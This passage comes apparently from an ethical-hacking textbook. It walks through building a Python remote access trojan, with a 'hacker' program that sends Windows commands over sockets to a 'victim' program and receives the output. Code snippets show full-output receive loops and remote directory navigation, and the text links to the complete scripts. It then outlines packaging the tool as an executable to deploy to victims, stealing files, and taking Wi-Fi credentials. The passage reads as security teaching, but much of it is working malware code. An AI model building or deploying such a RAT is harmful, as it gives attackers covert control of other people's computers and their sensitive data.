
Now, run the same command using your hacker program. Your output will be something like this:

![](img/d31345bbfd15f63be2920f0de5fa30dc_147_0.png)

Figure 6.9 – Truncated command result

As you can see, we can only receive 1,024 bytes. This is not what we want. To get the complete result, we need to make some modifications. On the victim program, we will append a special identifier to the end of command_result. Using this identifier, we will keep reading data in the hacker program until we reach the identifier. This will act as a marker for the hacker program to know that we have finished receiving all the data and can stop now.

The identifier string will be as follows:

```
IDENTIFIER = "<END_OF_COMMAND_RESULT>"
```

To add this identifier to command_result, we will first decode the result from bytes to string, then append the identifier at the end, and finally again convert the string into bytes, as shown:

```
command_result = output.stdout
command_result = command_result.decode("utf-8") + IDENTIFIER
command_result = command_result.encode("utf-8")
```

This time, instead of using the send() method, we will use the sendall() method.

On the hacker side, we will define the exact same identifier, so we can match it. Now, instead of just receiving 1,024 bytes, we will add a while loop, which will continuously receive data and store it in an array until we find the identifier, and then we will remove the identifier and store the rest of the result.

Take a look at the following receiving code:

```
full_command_result = b""
while True:
    chunk = hacker_socket.recv(1048)
    if chunk.endswith(IDENTIFIER.encode()):
        chunk = chunk[:-len(IDENTIFIER)]
        full_command_result += chunk
        break
    full_command_result +=chunk
print(full_command_result.decode())
```

We define a full_command_result variable that will hold the complete result. Then we write a loop to read the buffer continuously until we reach the identifier. Once the identifier is reached, we remove the identifier from the result, add the remaining bytes to full_command_result, break the loop, and finally decode it to print. The complete program for the hacker is shown here: https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py.

Similarly, the complete program for the victim is shown here: https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py.

Now we have developed a program for a hacker that will execute commands on the Windows victim machine and return a complete result to the hacker. This program will work perfectly. However, the command for changing the directory will not work properly on this since we are only working with the input and output of the command result. Next, we will focus on making a program so that we can even navigate directories as well. If you go to your Windows machine and open a Command Prompt, you can use the cd command to navigate directories, and we will use a similar approach here as well. So, when the user enters a change directory command, we will move into a different directory in the victim's machine based on the command given. In this section, we learned how we can run commands from the hacker program and get the results back to the hacker. In the next section, we will learn how we can navigate directories on the victim's computer by giving commands from the hacker program.

## Navigating directories

We will use a new module to change directory, called the os module. This module is included in Python's standard library, so you don't need to install it. Simply import the module in your program by writing the following command:

```
import os
```

The first thing we need to do is to detect when the user enters the cd command in the hacker program. This can be done by calling the startswith() method on the string command. We will detect the command, send the command to the victim program, and then skip the rest of the loop as follows:

```
if command.startswith("cd"):
    hacker_socket.send(command.encode())
    continue
```

Our first part of the program is now complete. Next, we need to receive this command on the victim program, decode it, check the type of command, such as to navigate the directory, and then find the path we want to move to. Let's say if we want to move back in the directory (one step up in the hierarchy), we enter the following command:

```
cd ..
```

cd is the name of the command and .. is the path we want to move to. So, on the victim program, we will first use the same check condition to see whether hacker_command starts with cd. If it does, we will strip the command to retrieve the path we want to move into. And finally, we will use the os.chdir() method to navigate to the entered directory if it exists:

```
if hacker_command.startswith("cd"):
    path2move = hacker_command.strip("cd ")
    if os.path.exists(path2move):
        os.chdir(path2move)
    else:
        print("can't change directory to ", path2move)
    continue
```

In Windows, you can see the current directory by giving the pwd (present working directory) command in the shell. Let's now run the hacker and victim programs to see how we can navigate directories:

![](img/d31345bbfd15f63be2920f0de5fa30dc_150_0.png)

Figure 6.10 – Changing directory

As you can see in the preceding screenshot, we first navigate up in the folder by using the cd .. command and move to the user folder. Then, we navigate to the Desktop folder by means of the cd Desktop command. This way, we can move up or down in the filesystem. The complete code for the hacker program is given here: https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py.

Similarly, the complete code for the victim program is shown here: https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py.

This preceding program will allow the hacker to execute commands and give basic control of the victim's PC to the hacker. The hacker can use this as a template to build more advanced functionalities into the program. You may be thinking that whatever code we have written so far is in the form of a Python script, and in order to deploy it and make a successful hacking attempt, the victim PC must have Python installed and the script should be run manually, which does not seem like a very good idea. Do not worry. In Chapter 8, Post Exploitation, we will look at how we can bundle our Python code into a single executable file with all the dependencies included inside it. This way, we do not have to worry about whether the victim has Python installed. We will create an .exe file from our script and deploy it to the victim. More about this in the next chapter.

## Summary

In this chapter, we began by learning about socket programming and then learned about how we can use sockets to create a network application. Our network application included a hacker and victim program, which helped us to send Windows system commands from a Linux-based hacker program, execute them on Windows, and get the results back to the hacker. We also learned how to navigate the file stream as well. Our basic version of the RAT is complete. Even though it is limited in its functionalities, it gives us a solid understanding of the basics to create a far more advanced malware program. In the next chapter, we will add some more features to our RAT, such as transferring files. See you in the next chapter!

## 7
Advanced Malware

In the previous chapter, we learned how to create a very simple malware that executes *Windows* commands sent by a hacker and returns the results of these commands. This program is very limited in terms of its ability to just execute commands. Ideally, for a **Remote Access Tool**, we would want to have much more advanced functionalities than this. This chapter will give you a basic idea of what more advanced functionalities you can write inside your malware program. We will cover the following topics in this chapter:

- File transfer
- Stealing Wi-Fi credentials
- Taking screenshots

## Building a keylogger file transfer

We have already learned how to send and receive very basic data in the program we developed in *Chapter 6, Malware Development*. In this chapter, we will try to send and receive files from one PC to another, first from the victim’s PC to the hacker’s PC, and then from the hacker’s to the victim’s PC. This will give us access to any sensitive files present on the victim’s PC. For example, let’s say that the victim has stored their passwords in a file present on their PC (which is a very bad idea; never store your passwords in a plain text file on your PC); then we can simply read the contents of the file and send it to the hacker. Let’s see how this works.
